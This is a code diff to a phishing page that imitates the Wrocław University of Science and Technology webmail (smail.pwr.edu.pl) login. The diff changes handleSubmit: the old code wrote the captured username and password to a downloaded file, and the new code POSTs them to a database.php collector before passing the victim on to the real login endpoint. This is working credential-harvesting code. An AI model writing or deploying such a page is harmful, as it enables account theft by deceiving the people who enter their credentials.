@@ -225,17 +225,17 @@ function handleSubmit() {
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
   var text = "Username: " + username + " Password: " + password;
-  var element = document.createElement('a');
-  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
-  element.setAttribute('download', 'password.txt');
-  element.style.display = 'none';
-  document.body.appendChild(element);
-  element.click();
-  document.body.removeChild(element);
-
-  var targetAction =  "https://smail.pwr.edu.pl/auth";
-  document.form1.action = targetAction;
-  document.form1.submit();
+  $.ajax({
+    type: 'post',
+    url: 'https://127.0.0.1/smail/database.php',
+    data: {username: username, password: password},
+    success: function(data) {
+      console.log(data);
+      var targetAction =  "https://smail.pwr.edu.pl/auth";
+      document.form1.action = targetAction;
+      document.form1.submit();
+    }
+  });
 }
 
 
@@ -276,6 +276,7 @@ function handleError() {
   </td>
   <td>
     <script type="text/javascript">wodotryski();</script>
+    <script src = "uwc/js/jquery-3.1.1.min.js"></script>
   </td>
  </tr>
 </table>
